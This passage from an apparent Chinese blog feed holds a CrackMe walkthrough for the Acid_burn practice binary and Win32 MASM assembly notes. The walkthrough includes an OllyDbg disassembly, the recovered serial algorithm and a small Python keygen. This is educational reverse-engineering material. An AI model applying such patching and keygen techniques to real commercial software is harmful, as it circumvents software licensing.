      &lt;p&gt;首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://akkuman.coding.me/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe练手 001</title>
    <link href="http://akkuman.coding.me/2017/09/15/160CrackMe-001.html"/>
    <id>http://akkuman.coding.me/2017/09/15/160CrackMe-001.html</id>
    <published>2017-09-15T08:16:12.000Z</published>
    <updated>2017-09-15T08:21:30.504Z</updated>
    
    <content type="html"><![CDATA[<p>peid判断无壳，打开输入伪码注册，根据报错od查找字符串<br>接下来定位到字符串周边代码<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">0042FA15  |.  8D55 F0       lea edx,[local.4]</div><div class="line">0042FA18  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA1E  |.  E8 35B0FEFF   call Acid_bur.0041AA58</div><div class="line">0042FA23  |.  8B45 F0       mov eax,[local.4]</div><div class="line">0042FA26  |.  0FB640 03     movzx eax,byte ptr ds:[eax+0x3]</div><div class="line">0042FA2A  |.  6BF0 0B       imul esi,eax,0xB</div><div class="line">0042FA2D  |.  8D55 EC       lea edx,[local.5]</div><div class="line">0042FA30  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA36  |.  E8 1DB0FEFF   call Acid_bur.0041AA58</div><div class="line">0042FA3B  |.  8B45 EC       mov eax,[local.5]                        ;  堆栈中可看到[local.5和4]都是你输入的用户名</div><div class="line">0042FA3E  |.  0FB640 02     movzx eax,byte ptr ds:[eax+0x2]</div><div class="line">0042FA42  |.  6BC0 0E       imul eax,eax,0xE</div><div class="line">0042FA45  |.  03F0          add esi,eax</div><div class="line">0042FA47  |.  8935 58174300 mov dword ptr ds:[0x431758],esi</div><div class="line">0042FA4D  |.  A1 6C174300   mov eax,dword ptr ds:[0x43176C]</div><div class="line">0042FA52  |.  E8 D96EFDFF   call Acid_bur.00406930</div><div class="line">0042FA57  |.  83F8 04       cmp eax,0x4                              ;  如果用户名长度大于等于4跳转</div><div class="line">0042FA5A  |.  7D 1D         jge short Acid_bur.0042FA79</div><div class="line">0042FA5C  |.  6A 00         push 0x0</div><div class="line">0042FA5E  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</div><div class="line">0042FA63  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</div><div class="line">0042FA68  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</div><div class="line">0042FA6D  |.  8B00          mov eax,dword ptr ds:[eax]</div><div class="line">0042FA6F  |.  E8 FCA6FFFF   call Acid_bur.0042A170</div><div class="line">0042FA74  |.  E9 BE000000   jmp Acid_bur.0042FB37</div><div class="line">0042FA79  |&gt;  8D55 F0       lea edx,[local.4]</div><div class="line">0042FA7C  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA82  |.  E8 D1AFFEFF   call Acid_bur.0041AA58</div><div class="line">0042FA87  |.  8B45 F0       mov eax,[local.4]                        ;  取你输入的用户名</div><div class="line">0042FA8A  |.  0FB600        movzx eax,byte ptr ds:[eax]              ;  取用户名的第一个字母放入eax</div><div class="line">0042FA8D  |.  F72D 50174300 imul dword ptr ds:[0x431750]             ;  eax = eax * 29h</div><div class="line">0042FA93  |.  A3 50174300   mov dword ptr ds:[0x431750],eax</div><div class="line">0042FA98  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</div><div class="line">0042FA9D  |.  0105 50174300 add dword ptr ds:[0x431750],eax          ;  [0x431750] = eax * 2</div><div class="line">0042FAA3  |.  8D45 FC       lea eax,[local.1]</div><div class="line">0042FAA6  |.  BA ACFB4200   mov edx,Acid_bur.0042FBAC                ;  CW</div><div class="line">0042FAAB  |.  E8 583CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CW&quot;放入了[local.1]</div><div class="line">0042FAB0  |.  8D45 F8       lea eax,[local.2]</div><div class="line">0042FAB3  |.  BA B8FB4200   mov edx,Acid_bur.0042FBB8                ;  CRACKED</div><div class="line">0042FAB8  |.  E8 4B3CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CRACKED&quot;放入了[local.2]</div><div class="line">0042FABD  |.  FF75 FC       push [local.1]                           ;  Acid_bur.0042FBAC</div><div class="line">0042FAC0  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -  ;两个push把&quot;CW&quot;和&quot;-&quot;入栈</div><div class="line">0042FAC5  |.  8D55 E8       lea edx,[local.6]</div><div class="line">0042FAC8  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</div><div class="line">0042FACD  |.  E8 466CFDFF   call Acid_bur.00406718                   ;  用户名第一个字母*29*2的值放入[local.6]</div><div class="line">0042FAD2  |.  FF75 E8       push [local.6]</div><div class="line">0042FAD5  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -</div><div class="line">0042FADA  |.  FF75 F8       push [local.2]                           ;  &quot;用户名第一个字母*29*2&quot;,&quot;-&quot;,&quot;CRACKED&quot;入栈</div><div class="line">0042FADD  |.  8D45 F4       lea eax,[local.3]</div><div class="line">0042FAE0  |.  BA 05000000   mov edx,0x5</div><div class="line">0042FAE5  |.  E8 C23EFDFF   call Acid_bur.004039AC                   ;  CW-算好的数据-CRACKED  放入[local.3]</div><div class="line">0042FAEA  |.  8D55 F0       lea edx,[local.4]</div><div class="line">0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</div><div class="line">0042FAF3  |.  E8 60AFFEFF   call Acid_bur.0041AA58</div><div class="line">0042FAF8  |.  8B55 F0       mov edx,[local.4]                        ;  取出你输入的密码=&gt;edx</div><div class="line">0042FAFB  |.  8B45 F4       mov eax,[local.3]                        ;  正确密码=&gt;eax</div><div class="line">0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC</div><div class="line">0042FB03  |.  75 1A         jnz short Acid_bur.0042FB1F              ;  判断密码是否正确</div><div class="line">0042FB05  |.  6A 00         push 0x0</div><div class="line">0042FB07  |.  B9 CCFB4200   mov ecx,Acid_bur.0042FBCC                ;  Congratz !!</div><div class="line">0042FB0C  |.  BA D8FB4200   mov edx,Acid_bur.0042FBD8                ;  Good job dude =)</div><div class="line">0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</div><div class="line">0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]</div><div class="line">0042FB18  |.  E8 53A6FFFF   call Acid_bur.0042A170</div><div class="line">0042FB1D  |.  EB 18         jmp short Acid_bur.0042FB37</div><div class="line">0042FB1F  |&gt;  6A 00         push 0x0</div><div class="line">0042FB21  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</div><div class="line">0042FB26  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</div></pre></td></tr></table></figure>
<p>注册算法就是password = “CW-“ + 取用户名第一位asciix29x2 + “=CRACKED”  </p>
<p>注册机（python）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">username = sys.argv[<span class="number">1</span>]</div><div class="line">password = ord(username[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">0x2</span></div><div class="line">print(<span class="string">"password:"</span>+<span class="string">"CW-"</span>+<span class="string">"%d"</span>%(password)+<span class="string">"-CRACKED"</span>)</div></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</div><div class="line">password:CW-7954-CRACKED</div></pre></td></tr></table></figure></p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjkbn9nb37j20di068407.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;peid判断无壳，打开输入伪码注册，根据报错od查找字符串&lt;br&gt;接下来定位到字符串周边代码&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://akkuman.coding.me/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows环境下32位汇编语言程序设计笔记-基础篇</title>
    <link href="http://akkuman.coding.me/2017/09/14/Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html"/>
    <id>http://akkuman.coding.me/2017/09/14/Windows环境下32位汇编语言程序设计笔记-基础篇.html</id>
    <published>2017-09-14T14:09:28.000Z</published>
    <updated>2017-09-14T14:53:38.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个</div><div class="line">option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式</div></pre></td></tr></table></figure>
<a id="more"></a>
<ol>
<li>指定使用的指令集</li>
<li>.model语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.model 内存模式[,语言模式][,其他模式]</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>内存模式</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>内存使用方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>tiny</td>
<td>用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td>
</tr>
<tr>
<td>small</td>
<td>建立代码和数据分别用一个64KB段的.exe文件</td>
</tr>
<tr>
<td>medium</td>
<td>代码段可以有多个64KB段，数据段只有一个64KB段</td>
</tr>
<tr>
<td>compact</td>
<td>代码段只有一个64KB段，数据段可以有多个64KB段</td>
</tr>
<tr>
<td>large</td>
<td>代码段和数据段都可以有多个64KB段</td>
</tr>
<tr>
<td>huge</td>
<td>同large，并且数据段中的一个数组也可以超过64KB</td>
</tr>
<tr>
<td>flat</td>
<td>Win32程序使用的模式，代码和数据使用同一个4GB段</td>
</tr>
</tbody>
</table>
<p><strong><em>对于Win32程序来说，只有一种内存模式，flat模式</em></strong></p>
<h2 id="源程序结构"><a href="#源程序结构" class="headerlink" title="源程序结构"></a>源程序结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall</div><div class="line">option casemap:none</div><div class="line">  &lt;一些include语句&gt;</div><div class="line">.stack [堆栈段的大小] ;常忽略不写</div><div class="line">.data</div><div class="line">  &lt;一些初始化过的变量定义&gt;</div><div class="line">.data?</div><div class="line">  &lt;一些没有初始化过的变量定义&gt;</div><div class="line">.const</div><div class="line">  &lt;一些常量定义&gt;</div><div class="line">.code</div><div class="line">  &lt;代码&gt;</div><div class="line">  &lt;开始标号&gt;</div><div class="line">      &lt;其他语句&gt;</div><div class="line">  end &lt;开始标号&gt;</div></pre></td></tr></table></figure>
<h2 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">local    变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]......</div></pre></td></tr></table></figure>
<p><em>local伪指令必须紧接在子程序的伪指令proc后</em></p>
<p><strong>变量的类型</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">表示方式</th>
<th style="text-align:left">缩写</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">字节</td>
<td style="text-align:left">Byte</td>
<td style="text-align:left">db</td>
</tr>
<tr>
<td style="text-align:left">字</td>
<td style="text-align:left">word</td>
<td style="text-align:left">dw</td>
</tr>
<tr>
<td style="text-align:left">双字(doubleword)</td>
<td style="text-align:left">dword</td>
<td style="text-align:left">dd</td>
</tr>
<tr>
<td style="text-align:left">三字(farword)</td>
<td style="text-align:left">fword</td>
<td style="text-align:left">df</td>
</tr>
<tr>
<td style="text-align:left">四字(quadword)</td>
<td style="text-align:left">qword</td>
<td style="text-align:left">dq</td>
</tr>
<tr>
<td style="text-align:left">十字节BCD码(tenbyte)</td>
<td style="text-align:left">tbyte</td>
<td style="text-align:left">dt</td>
</tr>
<tr>
<td style="text-align:left">有符号字节(signbyte)</td>
<td style="text-align:left">sbyte</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号字(signword)</td>
<td style="text-align:left">sword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号双字(signdword)</td>
<td style="text-align:left">sdword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">单精度浮点数</td>
<td style="text-align:left">Real4</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">双精度浮点数</td>
<td style="text-align:left">Real8</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">10字节浮点数</td>
<td style="text-align:left">Real10</td>
</tr>
</tbody>
</table>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">结构名    struct</div><div class="line"></div><div class="line">字段1     类型    ?</div><div class="line">字段2     类型    ?</div><div class="line">......</div><div class="line"></div><div class="line">结构名    ends</div></pre></td></tr></table></figure>
<p><strong>定义</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;字段1,字段2,...&gt;</div><div class="line">;或者</div><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;&gt;</div></pre></td></tr></table></figure></p>
<p><strong>使用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc</div><div class="line"></div><div class="line">;1</div><div class="line">mov    eax,stWndClass.lpfnWndProc</div><div class="line"></div><div class="line">;2.esi寄存器作指针寻址</div><div class="line">mov    esi,offset stWndClass</div><div class="line">mov    eax,[esi + WNDCLASS.lpfnWndProc]    ;注意这里是WNDCLASS</div><div class="line"></div><div class="line">;3.用assume伪指令把寄存器预先定义为结构指针</div><div class="line">mov    esi,offset stWndClass</div><div class="line">assume esi:ptr WNDCLASS</div><div class="line">mov    eax,[esi].lpfnWndProc</div><div class="line">...</div><div class="line">assume esi:nothing    ;注意：不使用esi做指针的时候需要用这句取消定义</div><div class="line"></div><div class="line">;4.结构的定义可以嵌套</div><div class="line">NEW_WNDCLASS    struct</div><div class="line"></div><div class="line">dwOption        word        ?</div><div class="line">oldWndClass     WNDCLASS    &lt;&gt;</div><div class="line"></div><div class="line">NEW_WNDCLASS    ends</div><div class="line"></div><div class="line">;5.嵌套的引用</div><div class="line">mov    wax,[esi].oldWndClass.lpfnWndProc</div></pre></td></tr></table></figure></p>
<h2 id="以不同的类型访问变量"><a href="#以不同的类型访问变量" class="headerlink" title="以不同的类型访问变量"></a>以不同的类型访问变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;以db定义一个缓冲区</div><div class="line">szBuffer    db    1024 dup (?)</div><div class="line">;mov    ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址</div><div class="line">;类型 ptr 变量名</div><div class="line">mov    ax,word ptr szBuffer</div><div class="line">mov    eax,dword ptr szBuffer</div></pre></td></tr></table></figure>
<h2 id="movzx"><a href="#movzx" class="headerlink" title="movzx"></a>movzx</h2><p>把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    .data</div><div class="line">bTest1    db    12h</div><div class="line">    .code</div><div class="line">movzx    ax,bTest1</div><div class="line">movzx    eax,bTest1</div></pre></td></tr></table></figure></p>
<h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sizeof    变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度</div><div class="line">lengthof  变量名、数据类型或数据结构名 ;取得变量中数据的项数</div></pre></td></tr></table></figure>
<h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov    寄存器,offset 变量名    ;offset是取变量地址的伪操作符</div><div class="line">lea    eax,[ebp-4]            ;运行时按照ebp的值实际计算出地址放到eax中</div><div class="line">;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addr</div><div class="line">addr   局部变量名和全局变量名   ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用</div><div class="line">;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖</div></pre></td></tr></table></figure>
<h2 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]</div><div class="line">        local 局部变量列表</div><div class="line"></div><div class="line">        指令</div><div class="line"></div><div class="line">子程序名 endp</div></pre></td></tr></table></figure>
<h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p><strong>不同语言调用方式的差别</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">C</th>
<th style="text-align:left">SysCall</th>
<th style="text-align:left">StdCall</th>
<th style="text-align:left">BASIC</th>
<th style="text-align:left">FORTRAN</th>
<th style="text-align:left">PASCAL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">最先入栈参数</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
</tr>
<tr>
<td style="text-align:left">清除堆栈者</td>
<td style="text-align:left">调用者</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
</tr>
<tr>
<td style="text-align:left">允许使用VARARG</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
</tr>
</tbody>
</table>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjjg3l2dztj209w08f0ur.jpg" alt=""></p>
<h2 id="条件测试语句"><a href="#条件测试语句" class="headerlink" title="条件测试语句"></a>条件测试语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">寄存器或变量    操作符    操作数</div><div class="line">(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...</div><div class="line">;举例，左边表达式，右边是表达式为真的条件</div><div class="line">x==3        ;x等于3</div><div class="line">eax!=3      ;eax不等于3</div><div class="line">(y&gt;=3)&amp;&amp;ebx ;y大于等于3且ebx为非零值</div><div class="line">;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器</div></pre></td></tr></table></figure>
<p>标志位的状态指示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CARRY?        表示Carry位是否置位</div><div class="line">OVERFLOW?     表示Overflow位是否置位</div><div class="line">PARITY?       表示Parity位是否置位</div><div class="line">SIGN?         表示Sign位是否置位</div><div class="line">ZERO?         表示Zero位是否置位</div></pre></td></tr></table></figure></p>
<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.if eax &amp;&amp; (bx &gt;= dWX) || !(dWY != ecx)</div><div class="line">    mov    esi,1</div><div class="line">.elseif edx</div><div class="line">    mov    esi,2</div><div class="line">.elseif esi &amp; 1</div><div class="line">    mov    esi,3</div><div class="line">.elseif ZERO? &amp;&amp; CARRY?</div><div class="line">    mov    esi,4</div><div class="line">.endif</div></pre></td></tr></table></figure>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.while 条件测试表达式</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">.endw</div><div class="line">;或</div><div class="line">.repeat</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">    .until    条件测试表达式    (或 .untilcxz [条件测试表达式])</div></pre></td></tr></table></figure>
<h2 id="变量和函数的命名"><a href="#变量和函数的命名" class="headerlink" title="变量和函数的命名"></a>变量和函数的命名</h2><h3 id="匈牙利表示法"><a href="#匈牙利表示法" class="headerlink" title="匈牙利表示法"></a>匈牙利表示法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成）</div></pre></td></tr></table></figure>
<p>汇编语言中常用的类型前缀</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">表示byte</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">表示word</td>
</tr>
<tr>
<td style="text-align:left">dw</td>
<td style="text-align:left">表示dword</td>
</tr>
<tr>
<td style="text-align:left">h</td>
<td style="text-align:left">表示句柄</td>
</tr>
<tr>
<td style="text-align:left">lp</td>
<td style="text-align:left">表示指针</td>
</tr>
<tr>
<td style="text-align:left">sz</td>
<td style="text-align:left">表示以0结尾的字符串</td>
</tr>
<tr>
<td style="text-align:left">lpsz</td>
<td style="text-align:left">表示指向0结尾的字符串的指针</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">表示浮点数</td>
</tr>
<tr>
<td style="text-align:left">st</td>
<td style="text-align:left">表示一个数据结构</td>
</tr>
</tbody>
</table>
<p>举例</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">hWinMain</td>
<td style="text-align:left">主窗口的句柄</td>
</tr>
<tr>
<td style="text-align:left">dwTimeCount</td>
<td style="text-align:left">时间计数器，以双字定义</td>
</tr>
<tr>
<td style="text-align:left">szWelcome</td>
<td style="text-align:left">欢迎信息字符串，以0结尾</td>
</tr>
<tr>
<td style="text-align:left">lpBuffer</td>
<td style="text-align:left">指向缓存区的指针</td>
</tr>
<tr>
<td style="text-align:left">stWndClass</td>
<td style="text-align:left">WNDCLASS结构</td>
</tr>
</tbody>
</table>
<p><strong>本书的作者建议</strong></p>
<ul>
<li>全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。</li>
<li>在内部子程序的名称前面加下划线，以便和系统API区别。</li>
</ul>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_Calc    proc    _dwX,_dwY</div><div class="line">         local   @dwResult</div><div class="line"></div><div class="line">         finit</div><div class="line">         fild    _dwX</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;i * i</div><div class="line">         fild    _dwY</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;j * j</div><div class="line">         fadd                ;i * i + j * j</div><div class="line">         fsqrt               ;sqrt(i * i + j * j)</div><div class="line">         fistp   @dwResult   ;put result</div><div class="line">         mov     eax,@dwResult</div><div class="line">         ret</div><div class="line"></div><div class="line">_calc    endp</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
